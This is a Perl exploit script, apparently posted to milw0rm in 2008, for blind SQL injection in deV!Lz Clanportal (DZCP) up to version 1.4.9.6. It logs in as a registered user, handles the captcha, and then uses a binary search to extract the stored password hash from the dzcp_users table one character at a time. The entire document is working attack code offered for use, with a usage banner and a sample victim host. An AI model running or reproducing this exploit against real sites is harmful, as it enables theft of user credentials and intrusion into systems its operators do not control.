<html><head><title>deV!Lz Clanportal [DZCP]  <= 1.4.9.6 Blind SQL Injection Exploit</title></head><pre>use HTTP::Cookies;
use LWP::UserAgent;
 
my $ua    = LWP::UserAgent-&gt;new( cookie_jar =&gt; HTTP::Cookies-&gt;new,);
 
$ua-&gt;agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
 
usage();
print &quot;\n&quot;;
 
$server =   $ARGV[0];
$dir = $ARGV[1];
$username =   $ARGV[2];
$password = $ARGV[3];
 
if (!$password) { die &quot;Argh! Read teh Usage!\n&quot;; }
 
$url0 = &quot;http://&quot;.$server.$dir.&quot;user/index.php&quot;;
$url1 = $url0.&quot;?action=login&amp;do=yes&quot;;
$url2 = $url0.&quot;?action=buddys&amp;do=addbuddy&quot;;
 
syswrite(STDOUT, &quot;[x]Connecting...&quot;, 16);
 
$response = $ua-&gt;get($url0);
if($response-&gt;is_success) {syswrite(STDOUT, &quot;OK&quot;, 2);} else { print &quot;\n[x]Ey I couldn't connect to &quot;.$url0; exit;}
print &quot;\n&quot;;
 
$captcha = ($response-&gt;content =~ m/secure=login/i) ? 1 : 0;
 
if($captcha) { captcha(); }
 
$response = (!$captcha) ? $ua-&gt;post($url1, [ &quot;user&quot; =&gt; $username, &quot;pwd&quot; =&gt; $password ]) : $ua-&gt;post($url1, [ &quot;user&quot; =&gt; $username, &quot;pwd&quot; =&gt; $password , &quot;secure&quot; =&gt; $imgCode]);
 
if($response-&gt;content =~ m/Sicherheitsscode/i) { print &quot;[x]Lol you gave me wrong image code. Restart!&quot;; exit; }
elsif($response-&gt;content =~ m/gesperrt/i) { print &quot;[x]Omg you gave me wrong user details. Restart!&quot;; exit; }
 
$response = $ua-&gt;get($url2);
 
print &quot;[x]Kay, unleashing BlackMagic now. Getta Coffee and wait!!\n&quot;;
 
my @Daten;
array();
 
my $operator;
 
syswrite(STDOUT, &quot;[x]Password: &quot;, 13);
 
for($b=1;$b&lt;=32;$b++) { inject(0,16); }
 
print &quot;\n[x]OmFg I made it!!\n&quot;;
print &quot;[x]Have FUN!\n&quot;;
print &quot;[x]Greetz &amp; Shoutz go to: IP-Sh0k, haZl0oh, bizzit, NoNePub, thund3r ,ramon,\n&quot;;
print &quot;   J0hn.X3r, electron1x, Paloxus, -tmh- aka B-Baerchi, Nazrek aka Patrick_B, WooMic, codeblu815\n&quot;;
print &quot;   Free-Hack, Sys-Flaw, SoH and h4ck-y0u!\n&quot;;
print &quot;[x]Biggest Thanks go to Shadowleet aka \$h4d0wl33t who is simply the best at his stuff!&quot;;
 
sub hex_to_ascii($)
{       
        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
        return $str;
}
sub inject 
{
    $beg = $_[0]; $end = $_[1];   
    $mid = int(($beg + $end)/2); #print $mid.&quot;\n&quot;;
    if(&amp;equals($mid))
    {       
        syswrite(STDOUT, hex_to_ascii($Daten[$mid]), 1);                 
        return;   
    }
    elsif(&amp;bigger($mid)) { return inject($mid + 1, $end); }   
    else { return inject($beg, $mid - 1); }       
}
 
sub equals { $ack = $_[0]; if( &amp;request(&quot;=&quot;, $ack) !~ m/1242/i) { return 1; } }
 
sub bigger { $ack = $_[0]; if(&amp;request(&quot;&gt;&quot;, $ack) !~ m/1242/i) { return 1; } }
 
sub request
{   
    $operator = $_[0]; $bick = $_[1];                             #probably only users without dzcp_
    $response = $ua-&gt;post($url2, [ &quot;users&quot; =&gt; &quot;999 and if(substring((select pwd from dzcp_users limit 0,1),&quot;.$b.&quot;,1)&quot;.$operator.&quot;0x&quot;.$Daten[$bick].&quot;,null,(select 1 union select 2))&quot; ]);
    #print $response-&gt;content;
    return $response-&gt;content;
}
 
sub usage()
{
    print q
    {
    ------------------NON PUBLIC EXPLOIT-----------------
    #####################################################
            deV!L`z Clanportal BlackMagic EXPLOIT         
                  -Exploit coded by h0yt3r-             
     Usage: devilz.pl [Server] [Path] [Username] [Password]
     Sample:                           
     perl devilz.pl www.victim.com /devilz/ h0yt3r 1337 
 
     Exploit requires Username and Password, as the vul-
     nerable file is only visible for registered users! 
    #####################################################
    };
 
}
 
sub captcha
{
    print &quot;[x]Captcha required!\n&quot;;
    $captchaURL = &quot;http://&quot;.$server.$dir.&quot;/antispam.php?secure=login&quot;;
    my $captchaReq= $ua-&gt;get($captchaURL);
    open(IMG,&quot;&gt;captcha.jpg&quot;);
    binmode IMG;
    print IMG $captchaReq-&gt;content;
    close IMG;
    system('start captcha.jpg');
    print &quot;[x]Image Code: &quot;;
    $imgCode = &lt;STDIN&gt;;
    chop($imgCode);   
}
 
sub array
{
    for($b=30;$b&lt;=39; $b++) { push(@Daten,$b); }
    for($b=61;$b&lt;=66; $b++) { push(@Daten,$b); }
}

# milw0rm.com [2008-11-02]</pre></html>